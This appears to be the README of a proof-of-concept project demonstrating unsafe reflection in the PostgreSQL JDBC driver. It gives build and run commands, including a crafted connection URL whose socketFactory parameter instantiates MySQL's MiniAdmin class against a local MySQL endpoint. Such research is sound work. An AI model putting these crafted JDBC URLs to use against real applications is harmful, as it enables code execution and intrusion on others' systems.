### Compiling

$ mvn package

### Running

$ java -cp target/PostgreSQLUnsafeReflection-0.1.0.jar PostgreSQLUnsafeReflection "jdbc:postgresql://localhost:5432/lol?socketFactory=xxx&socketFactoryArg=yyy"

### Running loading other JAR libs from a directory (e.g. /tmp/vuln/libs)

$ java -cp "target/PostgreSQLUnsafeReflection-0.1.0.jar:/tmp/vuln/libs/*" PostgreSQLUnsafeReflection "jdbc:postgresql://localhost:5432/lol?socketFactory=com.mysql.cj.jdbc.admin.MiniAdmin&socketFactoryArg=jdbc:mysql://127.0.0.1:4444"
